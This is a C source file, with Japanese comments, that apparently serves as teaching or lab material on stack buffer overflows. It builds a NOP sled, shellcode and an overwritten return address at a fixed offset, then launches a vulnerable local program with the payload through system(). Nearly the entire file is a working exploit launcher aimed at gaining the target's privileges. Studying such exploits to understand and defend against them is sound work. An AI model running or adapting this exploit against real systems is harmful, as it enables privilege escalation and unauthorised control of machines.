#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"shellcode.h"

//攻撃対象の脆弱性を持った文字列の先頭から、攻撃対象のリターンアドレスが格納されているアドレスがどれだけ離れているか
#define TARGET_RETURN_ADDRESS_OFFSET 136

int main(int argc, char **argv){
	unsigned int i;
	unsigned long ret_addr, offset = 0;
	unsigned char *command, *buffer;

	printf("##### 攻撃者の情報 #####\n");
	printf("uid: %u, euid: %u\n", getuid(), geteuid());
	printf("size(nop_sled) = %lu, size(shellcode) = %lu\n", sizeof(nop_sled) - 1, sizeof(shellcode) - 1);
	printf("スタック領域の大まかなアドレスは %p です\n", &i);

	command = malloc(200);
	bzero(command, 200);
	strcpy(command, "./target \'");
	buffer = command + strlen(command);

	if(argc == 2) offset = atoi(argv[1]);
	ret_addr = (unsigned long) &i - offset;
	printf("基準になるローカル変数のアドレスからのオフセット = %lu\n", offset);
	printf("このアドレスがターゲットの脆弱性を持った文字列の先頭付近のアドレス(Nop sled)を指さなければいけません -> %p - %lu = 0x%lx\n", &i, offset, ret_addr);

	memcpy(buffer, nop_sled, sizeof(nop_sled) - 1);
	memcpy(buffer + sizeof(nop_sled) - 1, shellcode, sizeof(shellcode) - 1);
	memset(buffer + sizeof(nop_sled) - 1 + sizeof(shellcode) - 1, 0xcc, TARGET_RETURN_ADDRESS_OFFSET - (sizeof(nop_sled) - 1 + sizeof(shellcode) - 1));
	*((unsigned long*) (buffer + TARGET_RETURN_ADDRESS_OFFSET)) = ret_addr;
	strcat(command, "\'");

	printf("\nNop sled + Shellcode + Return address (ターゲットに送り込むシェルコードの内容)");
	for(i = 0; i < 200; i++) {
		if(i % 32 == 0) printf("\n%03d : ", i);
		printf("%02lx ", (unsigned long) buffer[i]);
	}
	printf("\n\n");

	system(command);
	free(command);
	
	return 0;
}
